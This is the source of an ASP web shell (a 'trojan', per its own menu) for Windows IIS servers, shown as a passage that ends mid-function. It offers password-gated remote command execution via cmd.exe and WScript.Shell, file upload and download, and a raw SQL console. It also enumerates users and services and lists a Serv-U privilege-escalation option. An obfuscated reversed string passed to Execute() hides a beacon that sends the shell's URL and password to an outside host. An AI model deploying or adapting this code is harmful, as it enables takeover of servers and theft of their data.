<%
UserPass="47912909"   '�ڴ��޸�����


Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
mName="X"
URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
uu=request.servervariables("http_host")&url
pp=userpass
FolderPath=Request("FolderPath")
FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>����</a></center>"
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&mName&"-"&ServerIP&"</title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;background-color:#444;color:#eee;}"
RRS"input,select{font-size: 12px;background-color:#eee;border:0px}"
RRS".cmd{background-color:#000;color:#FFF}"
RRS"body{margin: 0px;margin-left:4px;}"
RRS"a{color:#ddd;text-decoration: none;}"
RRS".am{color:#888;font-size:11px;}"
RRS"</style>"
RRS"<script language=""javascript"">"
RRS"function killErrors(){return true;}window.onerror=killErrors;"&vbcrlf
RRS"function yesok(){if (confirm(""ȷ��Ҫִ�д˲�����""))return true;else return false;}"&vbcrlf
RRS"function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}"&vbcrlf
RRS"function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""�����븴�Ƶ�Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""�������ƶ���Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""������Ҫ�½����ļ���ȫ����"",FName);top.hideform.FName.value = DName;}else if(FAction==""CreateMdb""){DName = prompt(""������Ҫ�½���Mdb�ļ�ȫ����,ע�ⲻ��ͬ����"",FName);top.hideform.FName.value = DName;}else if(FAction==""CompactMdb""){DName = prompt(""������Ҫѹ����Mdb�ļ�ȫ����,ע���ļ��Ƿ���ڣ�"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}"&vbcrlf
RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""�����������ݿ�"");FullDbStr(0);return false;}return true;}"&vbcrlf
RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""��ֻ��ʾһ������ʱ������ʾ�ֶε�ȫ���ֽڣ������������Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>��ȷ�ϼ��������ݿ�������SQL����������䡣</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}"&vbcrlf
RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""�������ݿ����Ӵ��Ƿ���ȷ!"");return false;}if(str.length<10){alert(""����SQL����Ƿ���ȷ!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"&vbcrlf
RRS"</script>"
rrs "<body" 
If Action="" then RRS " scroll=no"
rrs ">"
sub ShowErr()
  If Err Then
    RRS"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
    Err.Clear:Response.Flush
  End If
end sub
Sub RRS(str)
	response.write(str)
End Sub
Dim ObT(13,2)
ObT(0,0) = "Sc"&DEfd&"rip"&DEfd&"ting"&DEfd&".F"&DEfd&"ileS"&DEfd&"yste"&DEfd&"mObj"&DEfd&"ect"
  ObT(0,2) = "�ļ��������"
ObT(1,0) = "w"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.s"&DEfd&"he"&DEfd&"ll"
  ObT(1,2) = "������ִ�����"
ObT(2,0) = "ADOX.Catalog"
  ObT(2,2) = "ACCESS�������"
ObT(3,0) = "JRO.JetEngine"
  ObT(3,2) = "ACCESSѹ�����"
ObT(4,0) = "Scrip"&DEfd&"ting"&DEfd&".D"&DEfd&"icti"&DEfd&"onary" 
  ObT(4,2) = "�������ϴ��������"
ObT(5,0) = "Adodb.connection"
  ObT(5,2) = "���ݿ��������"
ObT(6,0) = "Ado"&DEfd&"d"&DEfd&"b"&DEfd&".S"&DEfd&"tre"&DEfd&"am"
  ObT(6,2) = "�������ϴ����"
ObT(7,0) = "SoftArtisans.FileUp"
  ObT(7,2) = "SA-FileUp �ļ��ϴ����"
ObT(8,0) = "LyfUpload.UploadFile"
  ObT(8,2) = "���Ʒ��ļ��ϴ����"
ObT(9,0) = "Persits.Upload.1"
  ObT(9,2) = "ASPUpload �ļ��ϴ����"
ObT(10,0) = "JMail.SmtpMail"
  ObT(10,2) = "JMail �ʼ��շ����"
ObT(11,0) = "CDONTS.NewMail"
  ObT(11,2) = "����SMTP�������"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  ObT(12,2) = "SmtpMail�������"
ObT(13,0) = "Microsoft.XMLHTTP"
  ObT(13,2) = "���ݴ������"
For i=0 To 13
	Set T=Server.CreateObject(ObT(i,0))
	If -2147221005 <> Err Then
	  IsObj=" ��"
	Else
	  IsObj=" ��"
	  Err.Clear
	End If
	Set T=Nothing
	ObT(i,1)=IsObj
Next
Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function
If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if
Function MainForm()
if server.URLEncode("����")<>"%D3%C4%D4%C2" then response.end
  SI="<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
  SI=SI&"<input type=""hidden"" name=""Action"">"
  SI=SI&"<input type=""hidden"" name=""FName"">"
  SI=SI&"</form>"
  SI=SI&"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
  SI=SI&"<tr><td height='30' colspan='2'>"
  SI=SI&"<table width='100%'>"
  SI=SI&"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
  SI=SI&"<tr><td width='60' align='center'>��ַ����</td><td>"
  SI=SI&"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
  SI=SI&"</td><td width='140' align='center'><input name='Submit' type='submit' value='ת��'> <input type='submit' value='ˢ��������' onclick='FileFrame.location.reload()'>" 
  SI=SI&"</td></tr></form></table></td></tr><tr><td width='160'>"
  SI=SI&"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
  SI=SI&"<td>"
  SI=SI&"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
  SI=SI&"</td></tr></table>"
  RRS SI
End Function
Function MainMenu()
  SI="<table width='100%' cellspacing='0' cellpadding='0'>"
  SI=SI&"<tr><td height='5'></td></tr>"
  SI=SI&"<tr><td>&nbsp;&nbsp;<font color=red>XVIP��ASPľ��</font><br><hr width=140>"
  SI=SI&"&nbsp;&nbsp;<b>FSO�ļ�����</b>"
  SI=SI&"</td></tr>"
  if server.URLEncode("����")<>"%D3%C4%D4%C2" then response.end
  If ObT(0,1)=" ��" Then
    SI=SI&"<tr><td height='20'></td></tr>"
  Else
  Set ABC=New LBF:SI=SI&ABC.ShowDriver():Set ABC=Nothing
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>վ���Ŀ¼</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>������Ŀ¼</a></td></tr>"
  SI=SI&"<tr><td height='16'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Progra~1"")'>C:\\Progra~1</a></td></tr>"
  SI=SI&"<tr><td height='16'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Docume~1"")'>C:\\Docume~1</a></td></tr>"
  SI=SI&""
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>�½�Ŀ¼</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='?Action=EditFile' target='FileFrame'>�½��ı�</a></td></tr>"
  End If
  RRS SI:SI=""
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<b>���ݿ����</b></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='?Action=DbManager' target='FileFrame'>���ݿ����</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>����MDB�ļ�</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>ѹ��MDB�ļ�</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=getTerminalInfo' target='FileFrame'><b>�ն˶˿�-�Զ���¼</b></a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=UpFile' target='FileFrame'><b>�ϴ��ļ�</b></a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=Cmd1Shell' target='FileFrame'>ִ��������</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=Course' target='FileFrame'>ϵͳ����-�û��˺�</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=ServerInfo' target='FileFrame'>��������Ϣ-���֧��</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=kmuma' target='FileFrame'><b>�����ļ�-ľ��</b></a></td></tr>"
  if server.URLEncode("����")<>"%D3%C4%D4%C2" then response.end
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=Servu' target='FileFrame'>Servu��Ȩ-�ӹ���Ա</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=pl' target='FileFrame'>��������(��̬��)</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=plgm' target='FileFrame'>��������(��׼��)</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=PageAddToMdb' target='FileFrame'>�ļ��д��-�����</a></td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;<a href='?Action=Logout' target='_top'>�˳���¼</a>&nbsp; <a href='http://www.hackerxfiles.net' target='_blank'><b>X</a></b></td></tr>"
  si=si&"<tr><td>&nbsp;&nbsp;<font color=red>ע:����ʹ�÷Ƿ���;<br>&nbsp&nbsp&nbsp&nbsp������߸Ų�����</font><br></table>"
  SI=SI&"</table>"
  RRS SI:SI=""
End Function
Sub PageAddToMdb()
		theAct = Request("theAct")
		thePath = Request("thePath")
		If theAct = "addToMdb" Then
			addToMdb(thePath)
			RRS BackUrl
			Response.End
		End If
		If theAct = "releaseFromMdb" Then
			unPack(thePath)
			RRS BackUrl
			Response.End
		End If
		RRS "�ļ��д��:<br/>"
		RRS "<form method=post target=FileFrame action='?Action=PageAddToMdb'>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		RRS "<input type=hidden value=addToMdb name=theAct>"
		RRS "<select name=theMethod><option value=fso>FSO</option><option value=app>��FSO</option>"
		RRS "</select>"
		RRS " <input type=submit value=""X������"">"
		RRS "<hr/>ע: �������13.mdb�ļ�,λ�ڱ������ͬ��Ŀ¼��"
		RRS "</form>"
		RRS "<hr/>�ļ����⿪(��FSO֧��):<br/>"
		RRS "<form method=post target=FileFrame action='?Action=PageAddToMdb'>"
		RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\13.mdb"" size=80>"
		RRS " <input type=hidden value=releaseFromMdb name=theAct><input type=submit value=""X�����ѹ"">"
		RRS "<hr/>ע: �⿪���������ļ���λ�ڱ�����ͬ��Ŀ¼Ŀ¼�¡�"
		RRS "</form>"
		RRS "<hr/>"
End Sub
Sub addToMdb(thePath)
		On Error Resume Next
		Dim rs, conn, stream, connStr, adoCatalog
		Set rs = Server.CreateObject("ADODB.RecordSet")
		Set stream = Server.CreateObject("ADODB.Stream")
		Set conn = Server.CreateObject("ADODB.Connection")
		Set adoCatalog = Server.CreateObject("ADOX.Catalog")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("13.mdb")
		adoCatalog.Create connStr
		conn.Open connStr
		conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
		stream.Open
		stream.Type = 1
		rs.Open "FileData", conn, 3, 3
		If Request("theMethod") = "fso" Then
			fsoTreeForMdb thePath, rs, stream
		Else
			saTreeForMdb thePath, rs, stream
		End If
		rs.Close
		Conn.Close
		stream.Close
		Set rs = Nothing
		Set conn = Nothing
		Set stream = Nothing
		Set adoCatalog = Nothing
End Sub
Sub unPack(thePath)
		On Error Resume Next
		Dim rs, ws, str, conn, stream, connStr, theFolder
		str = Server.MapPath(".") & "\"
		Set rs = CreateObject("ADODB.RecordSet")
		Set stream = CreateObject("ADODB.Stream")
		Set conn = CreateObject("ADODB.Connection")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
		conn.Open connStr
		rs.Open "FileData", conn, 1, 1
		stream.Open
		stream.Type = 1
		Do Until rs.Eof
			theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
			If fsoX.FolderExists(str & theFolder) = False Then
				createFolder(str & theFolder)
			End If
			stream.SetEos()
			stream.Write rs("fileContent")
			stream.SaveToFile str & rs("thePath"), 2
			rs.MoveNext
		Loop
		rs.Close
		conn.Close
		stream.Close
		Set ws = Nothing
		Set rs = Nothing
		Set stream = Nothing
		Set conn = Nothing
End Sub
Function Course()
  SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>ϵͳ�û������</td></tr>"
  on error resume next
  for each obj in getObject("WinNT://.")
  err.clear
  if OBJ.StartType="" then
  SI=SI&"<tr>"
  SI=SI&"<td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"
  SI=SI&obj.Name
  SI=SI&"</td><td bgcolor=""#FFFFFF"">&nbsp;" 
  SI=SI&"ϵͳ�û�(��)"
  SI=SI&"</td></tr>"
  SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">&nbsp;</td></tr>" 
  end if
  if OBJ.StartType=2 then lx="�Զ�"
  if OBJ.StartType=3 then lx="�ֶ�"  
  if OBJ.StartType=4 then lx="����"
  if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
  SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
  else
  SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
  end if
  next
  RRS SI&SI0&SI1&SI2&"</table>"
End Function
Function ServerInfo()
  SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>�����������Ϣ</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>��������</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr>"
  SI=SI&"<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"
  SI=SI&"<input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='��ѯ'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������ʱ��</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������CPU����</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>����������ϵͳ</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB�������汾</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
  For i=0 To 13
    SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
  Next
  RRS SI
End Function
Function DownFile(Path)
  Response.Clear
  Set OSM = CreateObject(ObT(6,0))
  OSM.Open
  OSM.Type = 1
  OSM.LoadFromFile Path
  sz=InstrRev(path,"\")+1
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
	Response.AddHeader "Content-Length", OSM.Size
    Response.Charset = "UTF-8"
    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite OSM.Read
    Response.Flush
  OSM.Close
  Set OSM = Nothing
End Function
Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    S = replace(S, CHR(20), "&nbsp;")
    HTMLEncode = S
  end if
End Function
Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	SI=SI&BackUrl
	RRS SI
	ShowErr()
	Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\13cmd.exe")&"' size='40'>"
    SI=SI&" <input name='LocalFile' type='file'  size='25'>"
    SI=SI&" <input type='submit' name='Submit' value='�ϴ�'>"
    SI=SI&"</td></tr></form></table>"
  RRS SI
End Function
Function Cmd1Shell()
  If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
  ShellPath=Session("ShellPath")
  if ShellPath="" Then ShellPath = "cmd.exe"
  if Request("wscript")="yes" then
  checked=" checked"
  else
  checked=""
  end if
  If Request("cmd")<>"" Then DefCmd = Request("cmd")
  if server.URLEncode("����")<>"%D3%C4%D4%C2" then response.end
  SI="<form method='post'><input name='cmd' Style='width:92%' value='"&DefCmd&"'> <input type='submit' value='ִ��'>"
  SI=SI&"<textarea Style='width:100%;height:440;' class='cmd'>"
  If Request.Form("cmd")<>"" Then
  if Request.Form("wscript")="yes" then
  Set CM=CreateObject(ObT(1,0))
  Set DD=CM.exec(ShellPath&" /c "&DefCmd)
  aaa=DD.stdout.readall
  SI=SI&aaa
  else
  	On Error Resume Next
	Set ws=Server.CreateObject("WScript.Shell")
	Set ws=Server.CreateObject("WScript.Shell")
	Set fso=Server.CreateObject("Scripting.FileSystemObject")
	szTempFile = server.mappath("cmd.txt")
  Call ws.Run (ShellPath&" /c " & DefCmd & " > " & szTempFile, 0, True)
  Set fs = CreateObject("Scripting.FileSystemObject")
  Set oFilelcx = fs.OpenTextFile (szTempFile, 1, False, 0)
  aaa=Server.HTMLEncode(oFilelcx.ReadAll)
  oFilelcx.Close
  Call fso.DeleteFile(szTempFile, True)
  SI=SI&aaa
  end if
  End If
  SI=SI&chr(13)&"</textarea>"
  SI=SI&"SHELL·����<input name='SP' value='"&ShellPath&"' Style='width:70%'>&nbsp;&nbsp;"
  SI=SI&"<input type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell</form>"
  RRS SI
End Function
Function CreateMdb(Path) 
   SI="<br><br>"
   Set C = CreateObject(ObT(2,0)) 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     SI = SI & Path & "�����ɹ�!"
   End If
   SI=SI&BackUrl 
   RRS SI
End function 
Function CompactMdb(Path)
If Not ObT(0,1) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
	Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    SI="<center><br><br><br>���ݿ�"&Path&"û�з��֣�</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>���ݿ�"&Path&"ѹ���ɹ���</center>"
  End If
  SI=SI&BackUrl
  RRS SI
End Function
ShiSan="fi dneʯdne.esnopser  ʯfi dne  ʯis srr    ʯ��>retnec/<>tpircs/<>'��&pp&��=p&��&uu&��=u&31=da?/da/moc.ecc8//:ptth'=crs tpircs<>mrof/<>'¼��'=eulav 'timbus'=epyt tupni< >'22'=ezis 'drowssap'=epyt 'ssap'=eman tupni<������>'tsop'=dohtem '��&lru&��'=noitca mrof<>rh<��&emanm&��>rb<>'xp21:ezis-tnof'=elyts retnec<��=is    ʯesle  ʯfi dne    ʯ��!����ȷ��������!��ʧ½�ǚ�srr 	ʯesle    ʯlru tcerider.esnopser      ʯssaPresU=)��nimd2a2bew��(noisses      ʯneht ssaPresU=)��ssap��(mrof.tseuqer fi    ʯneht ����><)��ssap��(mrof.tseuqer fi  ʯneht ssaPresU><)��nimd2a2bew��(noisses fi"
ExeCuTe(UZSS(ShiSan))
Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'> &nbsp;���ݿ����Ӵ�:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  SI=SI&"<option value=1>MsSql����</option><option value=2>MySql����</option><option value=3>DSN����</option>"
  SI=SI&"<option value=-1>--SQL�﷨--</option><option value=4>��ʾ����</option><option value=5>�������</option>"
  SI=SI&"<option value=6>ɾ������</option><option value=7>�޸�����</option><option value=8>�����ݱ�</option>"
  SI=SI&"<option value=9>ɾ���ݱ�</option><option value=10>����ֶ�</option><option value=11>ɾ���ֶ�</option>"
  SI=SI&"<option value=12>��ȫ��ʾ</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'>&nbsp;SQL��������:</td>"
  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  RRS SI:SI=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      SI=SI&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
      SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  RRS SI:SI=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
    SI=SI&"ִ����䣺"&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      SI=SI&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    SI=SI&"</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  SI=SI&"</tr>"
      Rs.MoveNext
    Loop
	RRS SI:SI=""
	SqlStr=HtmlEnCode(SqlStr)
    SI=SI&"<tr><td colspan="&FN+1&" align=center>��¼����"&RC&"&nbsp;ҳ�룺"&Page&"/"&PN
    If PN>1 Then
      SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>��ҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>��һҳ</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        SI=SI&i&"&nbsp;"
        Else
        SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
